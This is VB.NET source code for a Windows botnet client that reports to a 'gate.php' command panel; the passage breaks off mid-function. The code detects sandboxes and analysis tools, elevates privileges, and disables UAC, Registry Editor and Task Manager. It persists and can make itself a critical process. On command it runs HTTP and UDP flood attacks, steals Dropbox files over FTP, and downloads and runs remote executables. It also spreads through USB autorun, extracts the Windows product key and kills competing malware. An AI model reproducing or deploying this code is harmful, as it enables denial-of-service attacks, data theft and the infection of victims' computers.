Imports System.Globalization
Imports System.IO
Imports System.Linq
Imports System.Net
Imports System.Net.NetworkInformation
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Security.Principal
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.Win32
'http://localhost/gate.php?0={HWID} = Just check for new commands
'http://localhost/gate.php?0={HWID}?CMD={COMMAND_NAME}?STATE={Good_OR_BAD} = Tells the panel that the command was eather done or errored
' 60|NONE
Public Class Main
    Dim Config As New Config
#Region "Startup"
    Dim CurrentSystemLog As String
    Dim Commander As New Thread(Sub() CommandWorker())
    Dim Persistence As New Thread(Sub() PersistenceWorker())
    Sub Begin()
        If CheckIfSandboxed() Then Application.Exit()  'Sandbox detected
        If MutexWorker() Then Application.Exit()  'Already Running
        SetHWID()
        If Config.ElevateRights Then
            If TryElevate() Then
                If Config.Install Then
                    If Config.DisableUAC Then DisableUAC()
                    If Config.DisableRegEdit Then DisableRegEdit()
                    If Config.DisableTaskMGR Then DisableTaskMGR()
                    Install()
                    If Config.Persistence Then Persistence.Start()
                End If
                If Config.MakeCritical Then MakeCritical(1)
            End If
        Else
            If Config.Install Then
                Install()
                If Config.Persistence Then Persistence.Start()
            End If
        End If
        Commander.Start()
    End Sub
#End Region
#Region "DDoS"
    Public ARMEFlood As Boolean = True
    Public UDPFlood As Boolean = False
#Region "ARME"

    Public Sub ARMEWorker(Target As String, PThread As Integer)
        Dim socks As Socket() = New Socket(PThread - 1) {}
        If Not Target.StartsWith("http://") Then
            Target = "http://" & Target
        End If
        Dim uri As New Uri(Target)
        For i As Integer = 0 To PThread - 1
            If Not ARMEFlood Then
                GoTo ENDLOOP
            End If
            socks(i) = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        Next
        While True
            If Not ARMEFlood Then
                GoTo ENDLOOP
            End If
            For i As Integer = 0 To PThread - 1
                If Not ARMEFlood Then
                    GoTo ENDLOOP
                End If
                If Not socks(i).Connected Then
RETRY_CONNECT:
                    If Not ARMEFlood Then
                        GoTo ENDLOOP
                    End If
                    Try
                        socks(i) = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                        socks(i).Connect(Dns.GetHostAddresses(uri.Host)(0), 80)
                        socks(i).Send(Encoding.ASCII.GetBytes(("HEAD " + uri.PathAndQuery & " HTTP/1.1" & vbCr & vbLf & "Host: ") + uri.Host & vbCr & vbLf & "User-Agent: " & RandomUserAgent() & vbCr & vbLf), SocketFlags.None)
                    Catch generatedExceptionName As Exception
                        If Not ARMEFlood Then
                            GoTo ENDLOOP
                        End If
                        Thread.Sleep(1000)
                        GoTo RETRY_CONNECT
                    End Try
                End If
                If Not ARMEFlood Then
                    GoTo ENDLOOP
                End If
            Next
            If Not ARMEFlood Then
                GoTo ENDLOOP
            End If
[LOOP]:
            If Not ARMEFlood Then
                GoTo ENDLOOP
            End If
            Try
                For i As Integer = 0 To PThread - 1
                    If Not ARMEFlood Then
                        GoTo ENDLOOP
                    End If
                    socks(i).Send(Encoding.ASCII.GetBytes("X-" & RandomNumberString(10) & ": 1" & vbCr & vbLf), SocketFlags.None)
                Next
            Catch generatedExceptionName As Exception
                Continue While
            End Try
            Thread.Sleep(4000)
            If Not ARMEFlood Then
                GoTo ENDLOOP
            End If
            GoTo [LOOP]
        End While
ENDLOOP:
        For i As Integer = 0 To PThread - 1
            If socks(i).Connected Then
                socks(i).Disconnect(False)
            End If
            socks(i) = Nothing
        Next
    End Sub
#End Region
#Region "UDP"
    Public Sub UDPWorker(IP As String, Port As Integer)
        Do While UDPFlood
            Dim udpClient As New UdpClient
            Dim bytCommand As Byte() = New Byte() {}
            udpClient.Connect(IP, Port)
            bytCommand = Encoding.ASCII.GetBytes(RandomString)
            udpClient.Send(bytCommand, bytCommand.Length)
        Loop
    End Sub
#End Region

#End Region
#Region "Antis"
    Public Function IsRunning(ParamArray processes As String()) As Boolean
        For Each p As Process In Process.GetProcesses()
            For Each process__1 As String In processes
                If p.ProcessName = process__1 Then
                    Return True
                End If
            Next
        Next
        Return False
    End Function

    Public Function IsModuleLoaded(ParamArray modules As String()) As Boolean
        For Each process__1 As Process In Process.GetProcesses()
            Try
                For Each [module] As ProcessModule In process__1.Modules
                    For Each moduleName As String In modules
                        If String.Compare([module].ModuleName, moduleName, True, CultureInfo.InvariantCulture) = 0 Then
                            Return True
                        End If
                    Next
                Next
            Catch
            End Try
        Next
        Return False
    End Function

    Public Function IsSandbox(ByVal ID As String)
        If GetWindowsProductId() = ID Then
            Return True
        Else
            Return False
        End If
    End Function

    Public Function CheckIfSandboxed() As Boolean
        Dim virtualPc = IsRunning("vpcmap", "vmsrvc", "vmusrvc")
        Dim virtualBox = isRunning("VBoxService")
        Dim wireshark = isRunning("wireshark.exe")
        Dim sandboxie = IsModuleLoaded("sbiedll.dll")
        Dim threatExpert = IsModuleLoaded("dbghelp.dll")
        Dim anubis = IsSandbox("76487-337-8429955-22614")
        Dim joeBox = IsSandbox("55274-640-2673064-23950")
        Dim cwSandbox = IsSandbox("76487-644-3177037-23510")
        Dim tools = IsRunning("NETSTAT", "FILEMON", "PROCMON", "REGMON", "CAIN", "NETMON", "TCPVIEW")
        If virtualBox OrElse virtualPc OrElse wireshark OrElse sandboxie OrElse anubis OrElse joeBox OrElse cwSandbox OrElse tools Then
            Return True
        Else
            Return False
        End If
    End Function
#End Region
#Region "Mutex"
    Public MutexSystem As Mutex
    Public Function MutexWorker()
        MutexSystem = New Mutex(False, Config.Mutex)
        If MutexSystem.WaitOne(0, False) = False Then
            MutexSystem.Close()
            MutexSystem = Nothing
            Return True
        Else
            Try
                Dim req As HttpWebRequest = HttpWebRequest.Create(GetPanel() & "/gate.php?cmd=3")
                Dim res As HttpWebResponse = req.GetResponse
                Dim sr As StreamReader = New StreamReader(res.GetResponseStream)
                Dim Raw As String
                Raw = sr.ReadToEnd
                Dim HWIDS As String() = Raw.Split(New Char() {"|"c})
                Dim HWID As String
                For Each HWID In HWIDS
                    MutexSystem = New Mutex(False, HWID)
                    If MutexSystem.WaitOne(0, False) = False Then 'If a older Mutex is found it will atempt to remove the old version
                        MutexSystem.Close()
                        MutexSystem = Nothing
                        If Uninstall() = True Then
                        End If
                    End If
                Next
                Return False
            Catch ex As Exception
                Return False
            End Try
            Return False
        End If
    End Function
#End Region
#Region "Stealers"
    Dim FileCount As Integer
    Public Sub StealDropbox(ByVal U As String, ByVal P As String, ByVal H As String, ByVal Files As String)
        If GetDropbox() = "" Then
        Else
            Try
                Dim F As String() = Files.Split(New Char() {"@"c})
                For Each fileType As String In F
                    For Each File As FileInfo In GetDropbox.GetFiles("*." & fileType, SearchOption.AllDirectories)
                        FileCount += 1
                        FTPUpload(U, P, H, File)
                    Next
                Next
            Catch ex As Exception : End Try
        End If
    End Sub

    Public Sub FTPUpload(ByVal U As String, ByVal P As String, ByVal H As String, ByVal Path As FileInfo)
        Dim filePath As String = Path.FullName
        Dim fileName As String = Path.Name
        Try
            Dim request As FtpWebRequest = DirectCast(WebRequest.Create(H & "/" & fileName), FtpWebRequest)
            request.Credentials = New NetworkCredential(U, P)
            request.Method = WebRequestMethods.Ftp.UploadFile
            Dim file() As Byte = IO.File.ReadAllBytes(filePath)
            Dim strz As Stream = request.GetRequestStream()
            strz.Write(file, 0, file.Length)
            strz.Close()
            strz.Dispose()
            HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=StealDropbox?STATE=Good")
        Catch ex As Exception
            HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=StealDropbox?STATE=Error")
        End Try
    End Sub
#End Region
#Region "Commands"
    Dim CMDLoop = True
    Dim Raw As String
    Public Sub FreshStart()
        If HTTPRequstWorker("0" & "?HWID==" & GetHWID()) = "Unkown" Then 'The  Client isnt known to the panel, Introduce the client. Else do nothing.
            HTTPRequstWorker("4" & "?HWID==" & GetHWID() & "?COUNTRY=" & GetCountry() & "?OS=" & GetOS() & "?KEY=" & GetWinKey() & "?IP=" & GetIP() & "?RAM=" & GetMemory() & "?ANTI=" & GetAntivirus() & "?BROWSER=" & GetBrowser() & "?NET=" & GetFramework() & "?HOSTNAME=" & GetHostName() & "?ADMIN=" & GetAdminStatus() & "?FIREWALL=" & GetFirewall() & "?CPU=" & GetProcessor() & "?USER=" & GetUsername() & "?DROPBOX=" & GetDropbox() & "?PATH=" & GetLocation())
        End If
    End Sub
    Public Sub CommandWorker()
        Do While CMDLoop = True
            Raw = HTTPRequstWorker("0" & "?HWID==" & GetHWID()) ' 60|OS|www.google.com (The first number is how long to wait to check for new commands)
            Dim CMD As String() = Raw.Split(New Char() {"|"c})
            If Raw = "" Then 'Error Connecting?
                Thread.Sleep(300000)
            ElseIf Raw = "Unkown" 'The  Client isnt known to the panel, Introduce the client.
                FreshStart()
            ElseIf Raw.Contains("|")
                Try
                    If Raw = Decrypt(GetRegistry("Software\Microsoft\Windows", "C", GetAdminStatus())) Then
                        Thread.Sleep(CMD(0) * 1000)
                    Else
                        Select Case CMD(1)
                            Case "CPA" 'Change Panel Address
                                SetPanel(CMD(2))
                                HTTPRequstWorker("1" & "?HWID==" & GetHWID() & "?CMD=CPA?STATE=Good")
                            Case "OS" 'OpenWebsite
                                Process.Start(CMD(2))
                                HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=OpenWebsite?STATE=Good")
                            Case "OSH" 'OpenWebsite Hidden
                                Dim OSH = New Thread(Sub() OpenWebsiteHidden(CMD(2)))
                                OSH.Start()
                            Case "DIE" 'Kill the client
                                HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=DIE?STATE=Good")
                                If GetAdminStatus() Then
                                    MakeCritical(0)
                                End If
                                Application.Exit()
                            Case "DoS" 'Start a DoS Attack
                                If CMD(2) = "ARME" Then '60|DoS|ARME|Start|127.0.0.1|5|2 = Start a ARME attack on 127.0.0.1 with 5 threads of 2 socks each to make 10 Socks sending attack
                                    If CMD(3) = "Start" Then
                                        Dim TempInt As Integer = 0
                                        TempInt = Convert.ToInt32(CMD(5)) ' # of Threads to make
                                        Dim TempInt2 As Integer = 0
                                        TempInt2 = Convert.ToInt32(CMD(6)) '# of Socks to make Per-Thread
                                        For i As Integer = 0 To TempInt - 1
                                            Dim ARMEThread = New Thread(Sub() ARMEWorker(CMD(4), TempInt2))
                                            ARMEThread.Start()
                                        Next
                                        HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=DOS?STATE=Good")
                                    ElseIf CMD(3) = "Stop" 'Kills the attack and closes all Socks
                                        ARMEFlood = False
                                        HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=DOS?STATE=Good")
                                    End If
                                ElseIf CMD(2) = "UDP" ' 60|DoS|UDP|Start|127.0.0.1|80|5
                                    If CMD(3) = "Start" Then
                                        Dim TempInt As Integer = 0
                                        TempInt = Convert.ToInt32(CMD(5)) ' # of Threads to make
                                        For i As Integer = 0 To Convert.ToInt32(CMD(6)) - 1
                                            Dim UDPThread = New Thread(Sub() UDPWorker(CMD(4), TempInt))
                                            UDPThread.Start()
                                        Next
                                        HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=DOS?STATE=Good")
                                    ElseIf CMD(3) = "Stop" 'Kills the attack and closes all Socks
                                        UDPFlood = False
                                        HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=DOS?STATE=Good")
                                    End If
                                End If
                            Case "SDB" 'Steal Dropbox
                                Dim SDB As New Thread(Sub() StealDropbox(CMD(2), CMD(3), CMD(4), CMD(5)))
                                SDB.Start()
                            Case "BW" 'Block/Unblock Websites
                                If CMD(2) = "Block" Then
                                    Dim BWTemp As String() = CMD(3).Split(New Char() {"@"c})
                                    For Each Site As String In BWTemp
                                        BlockWebsite(Site)
                                    Next
                                    HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=BlockWebsite?STATE=Good")
                                Else
                                    UnblockWebsite()
                                    HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=UnblockWebsite?STATE=Good")
                                End If
                            Case "MB" 'Show MessageBox
                                MBox(CMD(2), CMD(3), CMD(4))
                                HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=ShowMessageBox?STATE=Good")
                            Case "DR" 'Download and Run           60|DR|www.DontUseYourPanel.com/file.exe         
                                Dim DownloadRunThread As New Thread(Sub() DownloadNRun(CMD(2)))
                                DownloadRunThread.Start()
                            Case "AD" 'Show Adbox                 60|AD|www.localhost.com/MyAdPicture.png|www.LinkToOpen.com
                                '  Dim Ad As New AdBox
                                ' Ad.Show()
                                ' Ad.AdPicture = CMD(2)
                                ' Ad.AdLink = CMD(3)
                                '  HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=AD?STATE=Loaded")
                            Case "UN" 'Uninstall and Die
                                If Uninstall() Then
                                    If GetAdminStatus() Then
                                        MakeCritical(0)
                                    End If
                                    If HTTPRequstWorker("5" & "?HWID=" & GetHWID()) Then
                                        Dim si As New ProcessStartInfo()
                                        si.FileName = "cmd.exe"
                                        si.Arguments = "/C ping 1.1.1.1 -n 1 -w 4000 > Nul & Del """ & GetLocation() & """"
                                        si.CreateNoWindow = True
                                        si.WindowStyle = ProcessWindowStyle.Hidden
                                        Process.Start(si)
                                    Else
                                        HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=UN?STATE=Error")
                                    End If
                                End If
                            Case "USB" 'USB Spreader ' 60|USB
                                Dim USBSpreadThread As New Thread(Sub() USBInfect())
                                USBSpreadThread.Start()
                        End Select
                        SetRegistry("Software\Microsoft\Windows", "C", Encrypt(Raw), GetAdminStatus())
                    End If
                Catch ex As Exception
                    Thread.Sleep(300000)
                End Try
            Else
                Thread.Sleep(300000)
            End If
            Thread.Sleep(CMD(0) * 1000)
        Loop
    End Sub
#End Region
#Region "Spreaders"

    Private Sub USBInfect()
        For Each drive As DriveInfo In DriveInfo.GetDrives()
            If Not drive.IsReady OrElse drive.DriveType <> DriveType.Removable Then
                Continue For
            End If
            Try
                Dim autorun = Convert.ToString(drive.Name) & "autorun.inf"
                Dim binary = Convert.ToString(drive.Name) & "USBDriver.exe"
                If File.Exists(autorun) Then
                    File.Delete(autorun)
                End If
                If File.Exists(binary) Then
                    File.Delete(binary)
                End If
                Using writer = New StreamWriter(New FileStream(autorun, FileMode.Create, FileAccess.Write))
                    writer.WriteLine("[AutoRun]")
                    writer.WriteLine("action=USBDriver.exe")
                End Using
                File.Copy(CurrentProcessPath, binary, True)
                Const attributes As FileAttributes = FileAttributes.System Or FileAttributes.Hidden Or FileAttributes.[ReadOnly]
                File.SetAttributes(autorun, attributes)
                File.SetAttributes(binary, attributes)
            Catch
            End Try
        Next
    End Sub

#End Region
#Region "BotKiller"

    Dim applocal As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
    Dim temp As String = Environment.GetEnvironmentVariable("temp")
    Dim startup As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
    Dim appdata As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
    Dim users As String = Environment.GetEnvironmentVariable("userprofile")
    Dim split1 As Char = "5"
    Dim split2 As Char = "6"
    Private keylogger As String() = {"SetWindowsHookEx", "GetForegroundWindow", "GetWindowText", "GetAsyncKeyState"}
    Private injector As String() = {"SetThreadContext", "ZwUnmapViewOfSection", "VirtualAllocEx", "GetExecutingAssembly", "System.Reflection"}
    Private ircbot As String() = {"PRIVMSG", "JOIN", "USER", "NICK"}
    Private generic As String() = {"WSAStartup", "gethostbyname", "gethostbyaddr", "gethostname", "bs_fusion_bot", "MAP_GETCOUNTRY", "VS_VERSION_INFO", "LookupAccountNameA", "CryptUnprotectData", "Blackshades NET", "nanocore0\client", "Imminent", "LuminosityLink", "ddos", "DDoS", "IM3", "L\0u\0m\0i\0n\0o\0s\0i\0t\0y\0L\0i\0n\0k\0 \0i\0s\0 \0R\0u\0n\0n\0i\0n\0g", "ClientMain\0Imminent"}
    Private crypter As String() = {"MD5CryptoServiceProvider", "RijndaelManaged"}
    Private lobj As New List(Of PossibleThreat)()
    Public Structure PossibleThreat
        Public fullpath As String
        Public running As Boolean
        Public btype As JudgedAs
        Public regkey As String
        Public exename As String
    End Structure
    Public Enum JudgedAs
        Unknown = 17
        Keylogger = 18
        GenericBot = 19
        Injector = 20
        IRC_Bot = 21
    End Enum
    Public Sub ScanThread()
        Dim exscan As New Thread(New ThreadStart(AddressOf scan))
        exscan.SetApartmentState(ApartmentState.STA)
        exscan.Start()
        GC.Collect()
    End Sub
    Public Sub scan()
        Try
            lobj.Clear()
            Dim suspicious As New List(Of String)()
            For Each s As String In returnHKCU("Software\Microsoft\Windows\CurrentVersion\Run")
                If s.Contains(Config.InstallName) Then
                Else
                    suspicious.Add(s)
                End If
            Next
            For Each s As String In returnHKCU("Software\Microsoft\Windows\CurrentVersion\RunOnce")
                If s.Contains(Config.InstallName) Then
                Else
                    suspicious.Add(s)
                End If
            Next
            For Each s As String In returnHKLM("Software\Microsoft\Windows\CurrentVersion\Run")
                If s.Contains(Config.InstallName) Then
                Else
                    suspicious.Add(s)
                End If
            Next
            For Each s As String In returnHKLM("Software\Microsoft\Windows\CurrentVersion\RunOnce")
                If s.Contains(Config.InstallName) Then
                Else
                    suspicious.Add(s)
                End If
            Next
            For Each s As String In returnDirs(Environment.GetFolderPath(Environment.SpecialFolder.Startup))
                suspicious.Add(s)
            Next
            For Each f As String In suspicious
                Try
                    If usepath(f.Split(split1)(0)) Then
                        lobj.Add(scanFile(f))
                    End If
                Catch
                End Try
            Next
            Dim i As Integer = 0
            While i = lobj.Count - 1
                removeThreat(i)
                i += 1
            End While
        Catch
        End Try
    End Sub
    Public Function scanFile(path__1 As String) As PossibleThreat
        Try
            If File.Exists(path__1.Split(split1)(0)) Then
                Dim info As New PossibleThreat()
                info.fullpath = path__1.Split(split1)(0)
                info.regkey = path__1.Split(split1)(1)
                info.running = isRunning(path__1)
                info.exename = Path.GetFileName(info.fullpath)
                info.btype = JudgedAs.Unknown
                If info.fullpath = GetLocation() Then
                    Return New PossibleThreat()
                End If

                Dim tempstr As String = Encoding.UTF8.GetString(File.ReadAllBytes(info.fullpath)).Trim(ChrW(0))
                If tempstr IsNot Nothing Then
                    For Each s As String In generic
                        If tempstr.Contains(s) Then
                            info.btype = JudgedAs.GenericBot
                        End If
                    Next
                    For Each s As String In keylogger
                        If tempstr.Contains(s) Then
                            info.btype = JudgedAs.Keylogger
                        End If
                    Next
                    For Each s As String In injector
                        If tempstr.Contains(s) Then
                            info.btype = JudgedAs.Injector
                        End If
                    Next
                    For Each s As String In ircbot
                        If tempstr.Contains(s) Then
                            info.btype = JudgedAs.IRC_Bot
                        End If
                    Next
                    Return info
                Else
                    Return New PossibleThreat()
                End If
            Else
                Return New PossibleThreat()
            End If
        Catch
            Return New PossibleThreat()
        End Try
    End Function
    Private Sub removeThreat(lid As Integer)
        Try
            For Each p As Process In Process.GetProcesses()
                Try
                    If p.MainModule.FileName = lobj(lid).fullpath Then
                        p.Kill()
                        Thread.Sleep(1000)
                    End If
                Catch
                End Try
            Next
            File.Delete(lobj(lid).fullpath)
            Thread.Sleep(1000)
            If lobj(lid).regkey <> "" OrElse lobj(lid).regkey IsNot Nothing Then
                Select Case lobj(lid).regkey.Split("\"c)(0)
                    Case "HKEY_CURRENT_USER"
                        Dim tmp As String = lobj(lid).regkey.Remove(0, lobj(lid).regkey.IndexOf("\", StringComparison.Ordinal) + 1)
                        Dim subkey As String = tmp.Substring(0, tmp.LastIndexOf("\"c))
                        Dim name As String = tmp.Remove(0, tmp.LastIndexOf("\"c) + 1)
                        Dim regkey As RegistryKey = Registry.CurrentUser.OpenSubKey(subkey, True)
                        regkey.DeleteValue(name)
                        Exit Select

                    Case "HKEY_LOCAL_MACHINE"
                        Dim tmp2 As String = lobj(lid).regkey.Remove(0, lobj(lid).regkey.IndexOf("\", StringComparison.Ordinal) + 1)
                        Dim subkey2 As String = tmp2.Substring(0, tmp2.LastIndexOf("\"c))
                        Dim name2 As String = tmp2.Remove(0, tmp2.LastIndexOf("\"c) + 1)
                        Dim regkey2 As RegistryKey = Registry.LocalMachine.OpenSubKey(subkey2, True)
                        regkey2.DeleteValue(name2)
                        Exit Select
                End Select
            End If
            Thread.Sleep(1000)
        Catch
        End Try
    End Sub
    Private Function usepath(path As String) As Boolean
        If path.Contains(users) Then
            Return True
        Else
            Return False
        End If
    End Function
    Private Function returnHKCU(key As String) As List(Of String)
        Dim rstrs As New List(Of String)()
        For Each r As String In Registry.CurrentUser.OpenSubKey(key, False).GetValueNames()
            Dim rv As String = DirectCast(Registry.CurrentUser.OpenSubKey(key, False).GetValue(r), String)
            If rv.Contains("""") Then
                rv = rv.Split(""""c)(1)
            End If
            If rv.Contains("-") Then
                rv = rv.Split("-"c)(0)
            End If
            If rv.Contains("/") Then
                rv = rv.Split("/"c)(0)
            End If
            If rv.Contains(".exe") OrElse rv.Contains(".dll") OrElse rv.Contains(".bat") OrElse rv.Contains(".vbs") OrElse rv.Contains(".scr") Then
                rstrs.Add(rv & split1 & "HKEY_CURRENT_USER\" & key & "\" & r)
            End If
        Next
        Return rstrs
    End Function
    Private Function returnHKLM(key As String) As List(Of String)
        Dim rstrs As New List(Of String)()
        For Each r As String In Registry.LocalMachine.OpenSubKey(key, False).GetValueNames()
            Dim rv As String = DirectCast(Registry.LocalMachine.OpenSubKey(key, False).GetValue(r), String)
            If rv.Contains("""") Then
                rv = rv.Split(""""c)(1)
            End If
            If rv.Contains("-") Then
                rv = rv.Split("-"c)(0)
            End If
            If rv.Contains("/") Then
                rv = rv.Split("/"c)(0)
            End If
            If rv.Contains(".exe") OrElse rv.Contains(".dll") OrElse rv.Contains(".bat") OrElse rv.Contains(".vbs") OrElse rv.Contains(".scr") Then
                rstrs.Add(rv & split1 & "HKEY_LOCAL_MACHINE\" & key & "\" & r)
            End If
        Next
        Return rstrs
    End Function
    Private Function returnDirs(path As String) As List(Of String)
        Dim rstrs As New List(Of String)()
        For Each f As FileInfo In New DirectoryInfo(path).GetFiles()
            If f.FullName.Contains(".exe") OrElse f.FullName.Contains(".dll") OrElse f.FullName.Contains(".bat") OrElse f.FullName.Contains(".vbs") OrElse f.FullName.Contains(".scr") Then
                rstrs.Add(f.FullName + split1 + f.FullName)
            End If
        Next
        Return rstrs
    End Function
    Private Function isRunning(fullpath As String) As Boolean
        Dim ret As Boolean = False
        Try
            For Each p As Process In Process.GetProcesses()
                If p.MainModule.FileName = fullpath Then
                    ret = True
                End If
                Exit For
            Next
        Catch
        End Try
        Return ret
    End Function
#End Region
#Region "HTTP Worker"
    Public Function HTTPRequstWorker(Data As String) As String
        Try
            Dim result As String = Nothing
            Dim param As Byte() = Encoding.UTF8.GetBytes(Data)
            Dim req As WebRequest = WebRequest.Create(GetPanel)
            req.Method = "POST"
            DirectCast(req, HttpWebRequest).UserAgent = GetUserAgent()
            req.ContentType = "application/x-www-form-urlencoded"
            req.ContentLength = param.Length
            Dim st As Stream = req.GetRequestStream()
            st.Write(param, 0, param.Length)
            st.Close()
            st.Dispose()
            Dim resp As WebResponse = req.GetResponse()
            Dim sr As New StreamReader(resp.GetResponseStream())
            result = sr.ReadToEnd()
            sr.Close()
            sr.Dispose()
            resp.Close()
            Return result
        Catch
            Return "bad"
        End Try
    End Function
#End Region
#Region "Information"

    Public DropboxFolder As String
    Public pc As New Devices.Computer

    Public Function GetIP() As String
        Try
            Dim req As HttpWebRequest = HttpWebRequest.Create(GetPanel() & "/gate.php?cmd=2")
            Dim res As HttpWebResponse = req.GetResponse
            Dim sr As StreamReader = New StreamReader(res.GetResponseStream)
            Return sr.ReadToEnd
        Catch
            Return "Not found!"
        End Try
    End Function

    Public Function GetMemory() As String
        Dim MemBitSize As String = CStr(pc.Info.TotalPhysicalMemory)
        Select Case CDec(MemBitSize)
            Case 0 To CDec(999.999)
                MemBitSize = Format(CInt(CDec(MemBitSize)), "###,###,###,###,##0 bytes")
            Case 1000 To CDec(999999.999)
                MemBitSize = Format(CInt(CDec(MemBitSize) / 1024), "###,###,###,##0 KB")
            Case 1000000 To CDec(999999999.999)
                MemBitSize = Format(CInt(CDec(MemBitSize) / 1024 / 1024), "###,###,##0 MB")
            Case Is >= 1000000000
                MemBitSize = Format(CInt(CDec(MemBitSize) / 1024 / 1024 / 1024), "#,###.00 GB")
        End Select
        Return MemBitSize
    End Function

    Public Function GetFramework() As String
        Dim GlobalAsync As String = String.Empty
        Try
            Dim K As String = "SOFTWARE\Microsoft\Active Setup\Installed Components"
            Dim J As String = Nothing
            Dim V As String = Nothing
            Dim N As String = Nothing
            Dim R As RegistryKey = Registry.LocalMachine.OpenSubKey(K)
            Dim L As String() = R.GetSubKeyNames()
            For Each st As String In L
                Dim KE As RegistryKey = R.OpenSubKey(st)
                N = DirectCast(KE.GetValue(Nothing), String)
                If N IsNot Nothing AndAlso N.IndexOf(".NET Framework") >= 0 Then
                    V = DirectCast(KE.GetValue("Version"), [String])
                    If GlobalAsync.Contains(V.Chars(0)) Then Continue For
                    GlobalAsync += CStr(V.Chars(0)) + CStr(", ")
                End If
            Next
        Catch
            Return "Unknown"
        End Try
        Return GlobalAsync.Remove(GlobalAsync.Length - 2)
    End Function

    Public Function GetProcessor() As String
        Dim CPU As Object
        Dim DemCPUs As String = String.Empty
        Try
            Dim ohi As Object = GetObject("winmgmts:")
            For Each CPU In ohi.InstancesOf("Win32_Processor")
                DemCPUs &= CPU.Name
            Next
            Return DemCPUs
        Catch
            Return "No Processor was found"
        End Try
    End Function

    Public Function GetOS() As String
        Dim OSName As String() = {}
        Dim objOS As Object = New Management.ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem")
        For Each objMgmt As Object In objOS.Get
            OSName = objMgmt("name").ToString().Split("|")
        Next
        Return IIf((OSName(0) IsNot Nothing), OSName(0), "Unknown")
    End Function

    Public Function GetFirewall() As String
        Dim str As String = "None"
        Try
            Dim searcher As New Management.ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM FirewallProduct")
            Dim instances As Management.ManagementObjectCollection = searcher.[Get]()
            For Each queryObj As Management.ManagementObject In instances
                str = queryObj("displayName").ToString()
            Next
        Catch
        End Try
        Return str
    End Function

    Public Function GetAntivirus() As String
        Dim GlobalAsync As String = String.Empty
        Try
            Dim computer As String = Environment.MachineName
            Dim wmipath As String = IIf(Environment.OSVersion.Version.Major > 5, "\\" & computer & "\root\SecurityCenter2", "\\" & computer & "\root\SecurityCenter")
            Dim searcher As New Management.ManagementObjectSearcher(wmipath, "SELECT * FROM AntivirusProduct")
            Dim instances As Management.ManagementObjectCollection = searcher.[Get]()
            Dim a As String = "Antiviruses (" & instances.Count.ToString() & "):" & vbCr & vbLf
            For Each queryObj As Management.ManagementObject In instances
                Try
                    a += queryObj("companyName") & " - "
                Catch
                End Try
                Try
                    a &= queryObj("displayName") & vbCr & vbLf
                Catch
                End Try
            Next
            GlobalAsync = a
        Catch
        End Try
        If GlobalAsync.Contains(":") Then
            GlobalAsync = GlobalAsync.Split(CChar(":"))(1).TrimStart().TrimEnd()
        End If
        Return GlobalAsync
    End Function

    Public Function GetWinKey() As String
        Dim Keystring As String = ""
        Try
            Dim HexBuf As Object = Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\Windows NT\CurrentVersion", "DigitalProductId", 0)
            If HexBuf Is Nothing Then Return "N/A"
            Dim tmp As String = ""
            For l As Integer = LBound(HexBuf) To UBound(HexBuf)
                tmp = tmp & " " & Hex(HexBuf(l))
            Next

            Dim StartOffset As Integer = 52
            Dim EndOffset As Integer = 67
            Dim Digits(24) As String

            Digits(0) = "B" : Digits(1) = "C" : Digits(2) = "D" : Digits(3) = "F"
            Digits(4) = "G" : Digits(5) = "H" : Digits(6) = "J" : Digits(7) = "K"
            Digits(8) = "M" : Digits(9) = "P" : Digits(10) = "Q" : Digits(11) = "R"
            Digits(12) = "T" : Digits(13) = "V" : Digits(14) = "W" : Digits(15) = "X"
            Digits(16) = "Y" : Digits(17) = "2" : Digits(18) = "3" : Digits(19) = "4"
            Digits(20) = "6" : Digits(21) = "7" : Digits(22) = "8" : Digits(23) = "9"

            Dim dLen As Integer = 29
            Dim sLen As Integer = 15
            Dim HexDigitalPID(15) As String
            Dim Des(30) As String

            Dim tmp2 As String = ""

            For i As Integer = StartOffset To EndOffset
                HexDigitalPID(i - StartOffset) = HexBuf(i)
                tmp2 = tmp2 & " " & Hex(HexDigitalPID(i - StartOffset))
            Next

            For i As Integer = dLen - 1 To 0 Step -1
                If ((i + 1) Mod 6) = 0 Then
                    Des(i) = "+"
                    Keystring = Keystring & "+"
                Else
                    Dim HN As Integer = 0
                    For N As Integer = (sLen - 1) To 0 Step -1
                        Dim Value As Integer = ((HN * 2 ^ 8) Or HexDigitalPID(N))
                        HexDigitalPID(N) = Value \ 24
                        HN = (Value Mod 24)

                    Next
                    Des(i) = Digits(HN)
                    Keystring = Keystring & Digits(HN)
                End If
            Next
        Catch
        End Try
        Return StrReverse(Keystring)
    End Function

    Public Function GetAdminStatus() As Boolean
        Dim result As Boolean
        Try
            result = New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) 'True
        Catch
            result = False
        End Try
        Return result
    End Function

    Public Function GetBrowser() As String
        Dim browser As String = String.Empty
        Dim key As RegistryKey = Nothing
        Try
            key = Registry.ClassesRoot.OpenSubKey("HTTP\shell\open\command", False)
            browser = key.GetValue(Nothing).ToString().ToLower().Replace("""", "")
            If Not browser.EndsWith("exe") Then
